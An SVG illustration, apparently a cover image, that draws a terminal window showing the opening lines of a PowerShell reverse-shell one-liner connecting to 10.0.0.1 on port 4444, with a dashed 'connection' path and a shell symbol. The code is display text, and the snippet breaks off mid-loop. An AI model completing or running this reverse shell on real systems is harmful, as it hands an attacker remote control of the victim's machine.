<svg width="600" height="300" viewBox="0 0 600 300" xmlns="http://www.w3.org/2000/svg">
  <!-- Background gradient -->
  <defs>
    <linearGradient id="bgGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#1a1a2e" />
      <stop offset="100%" stop-color="#16213e" />
    </linearGradient>
    <linearGradient id="purpleGlow" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#7928CA" stop-opacity="0.6" />
      <stop offset="100%" stop-color="#8b5cf6" stop-opacity="0.3" />
    </linearGradient>
    <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="5" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
  </defs>
  
  <!-- Background -->
  <rect width="600" height="300" fill="url(#bgGradient)" />
  
  <!-- Grid pattern -->
  <g opacity="0.1" stroke="#8b5cf6" stroke-width="0.5">
    <path d="M0,30 L600,30" />
    <path d="M0,60 L600,60" />
    <path d="M0,90 L600,90" />
    <path d="M0,120 L600,120" />
    <path d="M0,150 L600,150" />
    <path d="M0,180 L600,180" />
    <path d="M0,210 L600,210" />
    <path d="M0,240 L600,240" />
    <path d="M0,270 L600,270" />
    
    <path d="M30,0 L30,300" />
    <path d="M60,0 L60,300" />
    <path d="M90,0 L90,300" />
    <path d="M120,0 L120,300" />
    <path d="M150,0 L150,300" />
    <path d="M180,0 L180,300" />
    <path d="M210,0 L210,300" />
    <path d="M240,0 L240,300" />
    <path d="M270,0 L270,300" />
    <path d="M300,0 L300,300" />
    <path d="M330,0 L330,300" />
    <path d="M360,0 L360,300" />
    <path d="M390,0 L390,300" />
    <path d="M420,0 L420,300" />
    <path d="M450,0 L450,300" />
    <path d="M480,0 L480,300" />
    <path d="M510,0 L510,300" />
    <path d="M540,0 L540,300" />
    <path d="M570,0 L570,300" />
  </g>
  
  <!-- Terminal with code -->
  <rect x="150" y="60" width="300" height="180" rx="5" fill="#111" stroke="#8b5cf6" stroke-width="1.5" />
  <rect x="150" y="60" width="300" height="20" rx="5" fill="#333" stroke="#8b5cf6" stroke-width="1.5" />
  <circle cx="165" cy="70" r="5" fill="#ff5f57" />
  <circle cx="185" cy="70" r="5" fill="#febc2e" />
  <circle cx="205" cy="70" r="5" fill="#28c840" />
  
  <!-- PowerShell command -->
  <text x="160" y="100" font-family="monospace" fill="#8b5cf6" font-size="10">PS C:\> $client = New-Object</text>
  <text x="160" y="120" font-family="monospace" fill="#8b5cf6" font-size="10">System.Net.Sockets.TCPClient('10.0.0.1',4444);</text>
  <text x="160" y="140" font-family="monospace" fill="#8b5cf6" font-size="10">$stream = $client.GetStream();</text>
  <text x="160" y="160" font-family="monospace" fill="#00adef" font-size="10">[byte[]]$bytes = 0..65535|%{0};</text>
  <text x="160" y="180" font-family="monospace" fill="#8b5cf6" font-size="10">while(($i = $stream.Read($bytes, 0,</text>
  <text x="160" y="200" font-family="monospace" fill="#8b5cf6" font-size="10">$bytes.Length)) -ne 0){$data = (New-Object</text>
  <text x="160" y="220" font-family="monospace" fill="#00adef" font-size="10">-TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);</text>
  
  <!-- Connection path -->
  <path d="M450,150 C500,150 530,100 550,100 S570,50 590,50" stroke="#8b5cf6" stroke-width="2" fill="none" stroke-dasharray="5,3" />
  <circle cx="450" cy="150" r="5" fill="#8b5cf6" />
  <circle cx="590" cy="50" r="5" fill="#8b5cf6" />
  
  <!-- Shell symbol -->
  <g transform="translate(100, 150) scale(0.4)">
    <path d="M0,0 L60,30 L0,60 Z" fill="#8b5cf6" />
    <path d="M70,40 L110,40" stroke="#8b5cf6" stroke-width="10" stroke-linecap="round" />
  </g>
  
  <!-- Circular glow effects -->
  <circle cx="450" cy="150" r="80" fill="url(#purpleGlow)" opacity="0.2" />
  <circle cx="150" cy="150" r="60" fill="url(#purpleGlow)" opacity="0.1" />
</svg>